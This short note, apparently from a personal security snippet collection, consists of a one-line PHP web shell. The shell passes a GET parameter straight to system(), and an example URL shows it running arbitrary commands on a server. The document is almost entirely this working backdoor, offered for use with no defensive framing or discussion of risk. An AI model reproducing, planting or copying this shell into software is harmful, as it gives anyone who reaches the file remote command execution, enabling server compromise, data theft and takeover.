---
tags:
  - php
  - security
---
```
<?php echo system($_GET['command']); ?>
```
Then you can send any command:
```
http://mysite/phpshell.php?command=ls
```